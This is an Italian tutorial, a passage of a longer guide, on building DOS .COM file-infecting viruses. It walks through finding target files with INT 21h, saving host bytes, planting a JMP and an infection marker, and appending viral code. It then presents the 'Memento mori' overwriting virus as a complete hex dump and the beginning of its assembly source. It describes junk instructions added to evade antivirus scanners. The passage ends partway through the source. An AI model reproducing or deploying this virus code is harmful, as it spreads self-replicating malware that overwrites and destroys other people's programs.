<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>La
funzione 4FH cerca il prossimo file:<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>mov
ah,4fh<span style="mso-spacerun: yes">           </span>; cerco il prossimo
file e aggiorno la DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Al primo ciclo in dx abbiamo inserito in ds:dx il
nome del primo file *.c.<span style="mso-spacerun: yes">  </span>Ma come fa il
programma a cercare il nome del secondo file dopo l'istruzione di next --&gt;
mov ah,4fh che cerca il prossimo file ? La soluzione viene dalla funzione 4fh
aggiorna ad ogni nuova apertura la DTA (che fra le altre cose contiene il nome
del file da aprire).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Per ricavare il nome del file devo saltare i primi
128 bytes del PSP e puntare all'offset 30 della DTA. Quindi: 128 (80h) + 30
(1e) = 158 (9eh).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>4. la routine di replicazione<o:p></o:p></span></b></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l1 level1 lfo15;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>Trovato il file da infettare, vengono copiati i primi 3,4
o 5 bytes dell’host e si salvano in un’area di memoria all’interno del codice
virale;<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l1 level1 lfo15;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>2.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>al posto di questi byte viene scritta un’istruzione di
salto (JMP) che salterà all’indirizzo della prima istruzione del codice virale;<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l1 level1 lfo15;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF'>3.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><span
style='color:#CCFFFF'>in append al file Com viene scritto il codice virale.<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoFooter style='tab-stops:35.4pt center 240.95pt right 481.9pt'><span
style='color:#CCFFFF'>1. salvataggio di primi bytes dell’host<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'>In genere viene utilizzata una
variabile contenuta all’interno del codice virus. Si consideri il seguente
esempio:<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes">     </span>mov<span style="mso-spacerun: yes">    
</span>cx,4<span style="mso-spacerun: yes">                  </span>; leggiamo
I primi 4 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,3f<span style="mso-spacerun:
yes">                 </span>; 3FH funzione di lettura dell’INT 21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+salva_bytes]<span
style="mso-spacerun: yes">   </span>; e li salviamo in salva_bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<span style="mso-spacerun:
yes">                    </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span><span
style="mso-spacerun: yes"> </span>~~~~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>~~~~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>~~~~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>salva_bytes:<span style="mso-spacerun: yes">          </span>;
area di salvataggio<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<span
style="mso-spacerun: yes">           </span>; istruzione nulla <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<span
style="mso-spacerun: yes">           </span>; istruzione nulla <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<span
style="mso-spacerun: yes">           </span>; istruzione nulla <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<span
style="mso-spacerun: yes">           </span>; istruzione nulla <o:p></o:p></span></b></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText><span style='color:#CCFFFF'>L’istruzione NOP necessita un
byte di codice e non fa nulla. In questo modo, salvando i quattro bytes letti
nell’area di memoria che parte dall’indirizzo della label salva_bytes si va a
ricoprire queste quattro istruzioni con i bytes letti.<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'>2.
scrittura dell’istruzione di salto<o:p></o:p></span></p>

<p class=MsoBodyText><span style='color:#CCFFFF'>Al posto dei primi n bytes
(poniamo 4) viene inserita un’istruzione di salto, cioè un JMP, un paio di
bytes che indicheranno al virus quanti bytes saltare, e un carattere
descrittore che serve per “marcare” il file infettato:<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">    </span><span
style="mso-spacerun: yes">    </span>mov<span style="mso-spacerun: yes">    
</span>ah,40<span style="mso-spacerun: yes">                     </span>;
40H=funzione di scrittura INT21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>cx,4<span style="mso-spacerun:
yes">                      </span>; numero di bytes da scrivere<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+salta_bytes]<span
style="mso-spacerun: yes">        </span>; indirizzo buffer contenente i bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<span style="mso-spacerun:
yes">            </span><span style="mso-spacerun: yes">            </span>;
scriviamo i bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>~~~~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>~~~~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>~~~~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>salta_bytes<span style="mso-spacerun: yes">      </span>db<span
style="mso-spacerun: yes">      </span>0e9h,0,0,'V'<span style="mso-spacerun:
yes">              </span>; il nostro 'jmp'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Nell’esempio di cui sopra è stato specificato un
vettore chiamato salta_bytes che contiene i seguenti bytes: <o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:
l6 level1 lfo17;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>09EH,
codice dell’istruzione JMP (3 bytes);<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:
l6 level1 lfo17;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>byte
di salvataggio per il numero bytes da saltare;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:
l6 level1 lfo17;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>byte
di salvataggio per il numero bytes da saltare;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:
l6 level1 lfo17;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>carattere
‘V’, marcatore di file infettato.<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>5.qualche
esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>I° Esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Memento_mori - Virus COM-infettore sovrascrittore.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Questo tipo di virus è molto semplice e la sua
struttura è alquanto primitiva. Esso si installa all’inizio dei files con
estensione *.COM della directory corrente ricoprendo i primi 76 bytes del file
ospitante.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Le operazioni che compie il virus una volta caricato
in memoria sono le seguenti:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l4 level1 lfo19;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>cerca
il primo file COM nella directory corrente;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l4 level1 lfo19;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>se
trovato lo apre;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l4 level1 lfo19;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>scrive
il proprio codice dalla locazione 100h;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l4 level1 lfo19;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>chiude
il file;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l4 level1 lfo19;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>cerca
il prossimo file da infettare.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>All’interno del codice sono state disseminate delle
istruzioni “dummy” che non svolgono alcuna funzione se non quella di nascondere
il codice alla scansione del software antivirus (senza queste istruzioni il
codice sarebbe facilmente identificato come facente parte della famiglia
TRIVIAL).<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;******************************************************************************<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>76-virus memento mori
v. 1.0<span style="mso-spacerun:
yes">                                              </span>* <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun:
yes">                                                   </span><span
style="mso-spacerun: yes">                         </span>*<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>virus non residente
.COM sovrascrittore con &quot;vuoto a perdere&quot;<span style="mso-spacerun:
yes">             </span>*<span style="mso-spacerun: yes">       </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>secondo la famiglia
Trivial. Infetta tutti i files con estensione .C*<span style="mso-spacerun:
yes">     </span>* <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>nella directory
corrente sovrascrivendo se' stesso all'inizio di<span style="mso-spacerun:
yes">          </span>*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>ogni file per un
offest di 76 bytes. Ogni file .com successivamente<span style="mso-spacerun:
yes">       </span>*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>lanciato visualizza
la stringa &quot;memento mori&quot; infettando i successivi<span
style="mso-spacerun: yes">     </span>*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>files.<span
style="mso-spacerun:
yes">                                                                 </span><span
style="mso-spacerun: yes">   </span>* <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun: yes">  </span>Dumping del
codice:<span style="mso-spacerun:
yes">                                                       </span>*<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<span style="mso-spacerun:
yes">                                                                           
</span>*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* 0000:<span style="mso-spacerun: yes">  </span>b4 4e 33 c9 8d
16 3a 01 cd 21 90 b8 01 00 ba 02<span style="mso-spacerun: yes">   
</span>.N3...:..!...... * <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* 0010:<span style="mso-spacerun: yes">  </span>00 eb 01 90 b8
03 00 ba 04 00 90 b8 02 3d ba 9e<span style="mso-spacerun: yes">   
</span>.............=.. *<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* 0020:<span style="mso-spacerun: yes">  </span>00 cd 21 90 b9
4c 00 8d 16 00 01 b4 40 cd 21 90<span style="mso-spacerun: yes">   
</span>..!..L......@.!. *<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* 0030:<span style="mso-spacerun: yes">  </span>b4 3e cd 21 b4
4f cd 21 73 e1 2a 2e 63 2a 00 6d<span style="mso-spacerun: yes">   
</span>.&gt;.!.O.!s.*.c*.m *<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* 0040:<span style="mso-spacerun: yes">  </span>65 6d 65 6e 74
6f 20 6d 6f 72 69 24<span style="mso-spacerun: yes">               
</span>emento mori$<span style="mso-spacerun: yes">     </span>*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;******************************************************************************<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>.model small<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>virus<span style="mso-spacerun:
yes">      </span>segment<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>org<span style="mso-spacerun: yes">  </span>100h<span
style="mso-spacerun: yes">            </span>; e' un programma .com <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>assume
cs:virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>len<span style="mso-spacerun: yes">        </span>equ offset
last-100h ; in len lunghezza del codice virale <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>start:<span style="mso-spacerun: yes">     </span>mov
ah,04eh<span style="mso-spacerun: yes">          </span>; cerca il primo file
nella dir. corrente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>xor cx,cx<span
style="mso-spacerun: yes">            </span>; maschera attributi del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; i bit degli attributi file della funzione 4eh sono i seguenti:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">   </span>bit 0 = 1 solo
lettura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">   </span>bit 1 = 1 nascosto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">   </span>bit 2 = 1 file di
sistema<span style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">   </span>bit 3 = 1 etichetta
di volume<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes">  
</span>bit 4 = 1 directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes">  
</span>bit 5 = 1 file di archivio<o:p></o:p></span></b></p>

